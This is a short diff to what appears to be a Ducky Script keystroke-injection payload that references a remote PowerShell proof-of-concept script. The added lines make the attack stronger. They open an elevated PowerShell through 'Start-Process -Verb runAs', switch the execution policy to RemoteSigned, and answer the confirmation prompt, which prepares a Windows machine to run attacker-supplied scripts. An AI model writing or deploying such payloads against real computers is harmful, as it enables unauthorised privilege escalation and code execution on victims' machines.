@@ -37,10 +37,15 @@ $githubScript = '<you_fork/poc.ps1>'
 DELAY 3000
 GUI r
 DELAY 500
-STRING powershell
-DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
 ENTER
-DELAY 750
+DELAY 1500
+STRING Set-ExecutionPolicy RemoteSigned
+ENTER
+DELAY 1000
+STRING a
+ENTER
+DELAY 1000
 STRING Set-WinUserLanguageList -LanguageList en-US -Force
 ENTER
 DELAY 750
